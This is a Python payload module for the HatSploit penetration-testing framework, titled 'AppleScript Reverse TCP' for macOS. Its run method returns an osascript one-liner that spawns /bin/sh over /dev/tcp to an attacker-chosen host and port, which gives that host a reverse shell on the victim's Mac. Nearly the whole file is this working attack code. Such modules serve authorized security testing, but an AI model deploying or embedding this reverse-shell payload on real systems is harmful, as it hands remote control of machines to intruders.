"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "AppleScript Reverse TCP",
            'Payload': "macos/generic/applescript_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "AppleScript reverse TCP payload.",
            'Architecture': "generic",
            'Platform': "macos",
            'Rank': "high",
            'Type': "reverse_tcp",
        }

    def run(self):
        payload = f"osascript -e 'do shell script \"/bin/sh &>/dev/tcp/{self.rhost.value}/{self.rport.value} 0>&1 &\"'"
        return payload
